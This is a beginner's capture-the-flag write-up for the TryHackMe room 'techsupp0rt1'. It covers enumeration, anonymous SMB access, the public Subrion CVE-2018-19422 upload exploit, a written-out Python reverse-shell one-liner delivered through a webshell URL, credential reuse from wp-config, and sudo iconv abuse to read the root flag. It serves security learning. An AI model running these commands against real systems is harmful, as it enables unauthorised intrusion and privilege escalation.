Tryhackme - techsupp0rt1

- Write-Up Author: stijn.vgils
- Flag: 851b8233a8c09400ec30651bd1529bf1ed02790b

## Challenge Description:

> Beginner-friendly TryHackMe room focused on web application enumeration and exploitation. 

<small>note for other beginners: it took me a while to get to the right steps in these challenges. This writeup is meant as a guide for when youre stuck, don't get demotivated just because trail and error wasn't documented; there was definitely a lot of trail and error. </small>

---
# Writeup
## Enumeration
#### nmap (port enumeration)
`nmap -p- <ip>`
![[nmap scan.png]]
- 80: default apache2 http webpage
- 139 / 445: often used for SMB
#### GoBuster (webpage enumeration)
`gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,js`
![[gobuster scan.png]]

##### /test
![[test page.png]]

##### /wordpress
![[wordpress page.png]]

### SMBclient (smb enumeration)
Tried listing the shares on the machine without logging in, anonymous login was allowed for a share named "websvr":
![[smbclient.png]]

Knowing anonymous login is enabled, lets check what is on the share:
![[websvr share.png]]

got the file to my local machine (`get enter.txt`), in there were some notes from the techsupport scammer about his goals with the webserver:
![[enter.txt.png]]

After some googling, I came across cyberchef, an open-source, browser-based data analysis and transformation tool. One of the possible "ingredients" was magic. Entering our encrypted password with cyberchef gave us the decrypted password "Scam2021":
![[cyberchef.png]]

## Initial access
Now that we have a password for "subrion", it's time to figure out what subrion actually is. Subrion is a free, open-source PHP/MySQL content management system (CMS) and web framework.
/subrion didnt work, like mentioned in the notes of the scammer. Though, the scammer mentioned a panel. /subrion/panel, did work! Using the credentials we found (admin : Scam2021), I managed to get into the subrion panel:
![[subrion panel.png]]

The panel mentioned a version number. After googling for the service number, I noticed a bunch of articles talking about [CVE-2018-19422](https://nvd.nist.gov/vuln/detail/cve-2018-19422) , allowing for execution of arbitrary PHP code. Searchsploit for Subrion 4.2.1 gave a few options, one of which was arbitrary file upload, sounded like a fit. Running it with the proper arguments (`python 49876.py -u http://<ip>/subrion/panel/ -l admin -p Scam2021`) got me a webshell:
![[searchsploit.png]]

I then tried upgrading to an interactive shell (`python -c 'import pty; pty.spawn("/bin/bash")'`), which didnt work, so I used a different python command to setup a reverse shell. 

>Note: I used this command on the actual webshell path, not through the python script, as this didnt work for me. After reading the python script, I figured out that the commands can be executed on `http://<ip>/subrion/uploads/<random string from the script>.phar?cmd=<cmd>`. This is the link that the script also sends, but without the "/panel".

First setting up a listener with `nc -lvnp <port>` on my attacker machine, then, to execute the command in the webshell (see note above), I went to:
```
http://<ip>/subrion/uploads/fpjxmzhausaujgv.phar?cmd=python%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<ip>%22,<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```
The URL-decoded command is:
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
After this, I could use the earlier mentioned `python -c 'import pty; pty.spawn("/bin/bash")'` command to upgrade to an interactive terminal:
![[initial access.png]]

### Privilege escalation: www-data to scamsite
Now that we have an interactive shell on the machine, lets find a way to find the flag.

The notes from the scammer said something about a wordpress site. Knowing that we are www-data, maybe we can find useful information in the wordpress directory. In the directory there is a wp-config file. I read the file, and it contains a plain-text username and password:
![[credentials.png]]

I was stuck here for a while, I logged in on the wordpress site but couldn't find much useful info there. I tried to switch to user "support" as said in the wp-config file, but that user didn't exist. I checked for existing users on the system in the /etc/passwd file, and found a user called scamsite:
![[etc passwd.png]]

I tried switching to the scamsite user with the password found in the wp-config file, and yes! We are now user scamsite.

### Abusing root privileges
With `sudo -l` I checked which privilege the scamsite user has. The user is allowed to run `/usr/bin/iconv` with sudo privileges. Iconv (internationalization conversion) is a tool used to convert text between different character encodings. The fun part is; we can also use files as an input. To abuse this, we can convert the root flag (often `/root/root.txt`) from UTF-8 to UTF-8, the output will be the flag:
![[solution.png]]

Doing so prints the flag: `851b8233a8c09400ec30651bd1529bf1ed02790b`! 🥳